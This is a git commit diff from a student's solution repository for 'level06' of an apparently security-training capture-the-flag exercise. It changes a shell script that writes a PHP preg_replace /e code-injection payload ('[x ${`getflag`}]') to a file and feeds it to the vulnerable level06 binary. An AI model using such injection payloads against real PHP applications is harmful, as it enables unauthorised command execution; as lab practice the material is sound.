b2d1890b53ba56b553d3bba720c463795acffb1b
mhufflep <mhufflep@student.21-school.ru>
2022-10-03 21:55:07 +0500

    level06 updated

--- level06/Resources/cmd.sh
+++ level06/Resources/cmd.sh
@@ -7,6 +7,6 @@
 # About /e pattern modifier
 # https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
 
-echo -e '[x {${exec(getflag)}}]' > /tmp/file
+echo -e '[x ${`getflag`}]' > /tmp/file
 
 ./level06 /tmp/file
